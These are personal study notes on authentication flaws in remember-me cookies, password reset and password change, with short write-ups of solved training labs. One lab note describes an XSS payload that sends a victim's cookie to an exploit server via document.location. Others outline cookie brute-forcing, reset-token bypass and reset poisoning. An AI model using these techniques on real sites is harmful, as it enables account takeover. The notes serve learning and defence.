:PROPERTIES:
:ID:       796b23c6-a896-4e52-b1a5-00cdd3809e02
:END:
#+title: Vulnerabilities in other authentication mechanisms
#+created: [2025-09-01 Mon 17:41]
#+filetags: :cyber:auth:
* Vulnerabilities in other authentication mechanisms
In addition to the basic login functionality, most websites provide supplementary functionality to allow users to manage their account. For example, users can typically change their password or reset their password when they forget it. These mechanisms can also introduce vulnerabilities that can be exploited by an attacker.

Websites usually take care to avoid well-known vulnerabilities in their login pages. But it is easy to overlook the fact that you need to take similar steps to ensure that related functionality is equally as robust. This is especially important in cases where an attacker is able to create their own account and, consequently, has easy access to study these additional pages.
** Keeping users logged in
A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".

This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. Once they work out the formula, they can try to brute-force other users' cookies to gain access to their accounts.

Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.
*** LAB Brute-forcing a stay-logged-in cookie
- solved: this one was tricky as I hadn't encounted hashes before.
  - I had to log in, see there was as cookie that tells the site I have logged in (stay logged in)
  - looking at this cookie in intruder it shows it is base 64 encoded
  - I can see that the resulting string is in the format 'username:+string'
  - it seems the string was an MD5 hash.
  - I figured out this was the only thing being used as an identifier in the web application, so I encoded all the passwords in the password list to find a match.
  - Once I did, I had found the carlos account.
Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.

In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.
*** Lab: Offline password cracking
- solved
  - I had to figure out that there was a cross site scipting exploit (js running in user input box)
  - I did this from putting a js alert in the comments section of a blog comment
  - once this was done, I went to the exploit server, copied the link. then added a script tag with document.location="url"+document.cookie
  - once posted carlos visited the blog post, and I got their cookie.
  - this cookie was created using an insecure method
  - it was encoded with base 64 then had a predictible format, then used an MD5 hash which isn't secure.
  - I used [[https://crackstation.net][crackstation.net]] to decode the MD5 hash.
** Resetting user passwords
In practice some users will forget their password, so it is common to have a way for them to reset it. As the usual password-based authentication is obviously impossible in this scenario, websites have to rely on alternative methods to make sure that the real user is resetting their own password. For this reason, the password reset functionality is inherently dangerous and needs to be implemented securely.

There are a few different ways that this feature is commonly implemented, with varying degrees of vulnerability.


Sending passwords by email

It should go without saying that sending users their current password should never be possible if a website handles passwords securely in the first place. Instead, some websites generate a new password and send this to the user via email.

Generally speaking, sending persistent passwords over insecure channels is to be avoided. In this case, the security relies on either the generated password expiring after a very short period, or the user changing their password again immediately. Otherwise, this approach is highly susceptible to man-in-the-middle attacks.

Email is also generally not considered secure given that inboxes are both persistent and not really designed for secure storage of confidential information. Many users also automatically sync their inbox between multiple devices across insecure channels.
** Resetting passwords using a URL
A more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. Less secure implementations of this method use a URL with an easily guessable parameter to identify which account is being reset, for example:

http://vulnerable-website.com/reset-password?user=victim-user
In this example, an attacker could change the user parameter to refer to any username they have identified. They would then be taken straight to a page where they can potentially set a new password for this arbitrary user.

A better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. In the best case scenario, this URL should provide no hints about which user's password is being reset.

http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. This token should expire after a short period of time and be destroyed immediately after the password has been reset.

However, some websites fail to also validate the token again when the reset form is submitted. In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password.
** Lab: Password reset broken logic
- solved:
  this lab had broken logic in their password reset system.
- I had to reset my password, go to the generated link, then when resetting the password and observing the post request, the form was submitting a hidden username field, and the application wasn't checking if the token was correct.
- so i deleted the token, and changed the username to carlos.
- then just logged in with the resetted password.
** LABS: Password reset poisoning via middleware
- solved:
  - for this one I had to figure out that the reset password link was being created from the url the user was just at.
  - this meant that an X-Forwarded-Host exploit could be used to put the url as our exploit server
  - carlos then clicked on our url
  - gave us their cookie, then just put that in the url and changed the pass manually.
** Changing user passwords
Typically, changing your password involves entering your current password and then the new password twice. These pages fundamentally rely on the same process for checking that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques.

Password change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user. For example, if the username is provided in a hidden field, an attacker might be able to edit this value in the request to target arbitrary users. This can potentially be exploited to enumerate usernames and brute-force passwords.
*** LAB Password brute-force via password change
- solved:
  had to reset my password; there was an error in the logic.
  If the current password was wrong, and the new passwords weren't matching, it would tell you.
  could do this multiple times without getting locked, then brute forced the password.
